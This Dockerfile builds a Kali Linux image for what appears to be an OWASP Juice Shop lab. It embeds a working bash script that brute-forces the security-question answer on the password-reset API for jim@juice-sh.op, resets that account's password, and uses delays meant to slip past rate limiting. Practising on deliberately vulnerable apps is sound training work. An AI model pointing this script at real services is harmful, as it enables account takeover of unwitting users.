# Base Image: Latest Kali Linux Rolling Release
FROM kalilinux/kali-rolling

# System Update & Upgrade
RUN apt update --fix-missing && apt upgrade -y

# Install Zsh Shell & Productivity Plugins (Better terminal experience)
RUN apt install -y zsh zsh-autosuggestions zsh-syntax-highlighting bash-completion

# Install Penetration Testing Tools
# Added python3 for local web server capabilities
RUN apt install -y curl gobuster nano nuclei sqlmap wget dos2unix python3

# Setup Wordlist Directory
# Only fetching specific wordlists to keep image size optimized
RUN mkdir -p /usr/share/wordlists/

# 1. Fetch Common Web Paths (For Gobuster - A01)
RUN wget -P /usr/share/wordlists/ https://github.com/danielmiessler/SecLists/raw/master/Discovery/Web-Content/common.txt

# 2. Fetch Top 1000 Male Names (For Brute-Force - A07)
RUN wget -P /usr/share/wordlists/ https://github.com/danielmiessler/SecLists/raw/master/Usernames/Names/malenames-usa-top1000.txt

# Create Custom Authentication Exploitation Tool
# This script automates the brute-forcing of the security question
RUN cat <<'EOF' > /usr/local/bin/brute_reset.sh
#!/bin/bash
TARGET="http://FSjuice1:3000/rest/user/reset-password"
USER="jim@juice-sh.op"
WORDLIST="/usr/share/wordlists/malenames-usa-top1000.txt"

echo "[!] Starting automated brute-force for $USER..."
echo "[!] Using wordlist: $WORDLIST"

while read -r raw_name; do
  [[ -z "$raw_name" || "$raw_name" == "#"* ]] && continue

  # Formatting: Convert names to Title Case (e.g., SAMUEL -> Samuel)
  name_lower=${raw_name,,}
  name=${name_lower^}

  # Execute POST request to the API
  RESPONSE=$(curl -s -o /dev/null -w "%{http_code}" -X POST "$TARGET" \
    -H "Content-Type: application/json" \
    -d "{\"email\": \"$USER\", \"answer\": \"$name\", \"new\": \"password123!\", \"repeat\": \"password123!\"}")

  if [ "$RESPONSE" == "200" ]; then
    echo -e "\n[+] SUCCESS! Found correct answer for $USER: $name"
    exit 0
  elif [ "$RESPONSE" == "429" ]; then
    echo -ne " [!] Rate limited (429). Sleeping 5s...   \r"
    sleep 5
  else
    echo -ne "[-] Attempting: $name (Status: $RESPONSE)   \r"
    # Small delay (300ms) to bypass basic rate limiting
    sleep 0.3
  fi
done < "$WORDLIST"

echo -e "\n[!] Brute-force finished. No valid answer found."
EOF

# Finalize Script Setup
# 1. Convert line endings (CRLF -> LF) using dos2unix
# 2. Make script executable
RUN dos2unix /usr/local/bin/brute_reset.sh && chmod +x /usr/local/bin/brute_reset.sh

# Set Working Directory and Environment Variables
WORKDIR /work
ENV LC_ALL=C.UTF-8
ENV RUNNING_IN_DOCKER=true

# Start container with Zsh
ENTRYPOINT ["/bin/zsh"]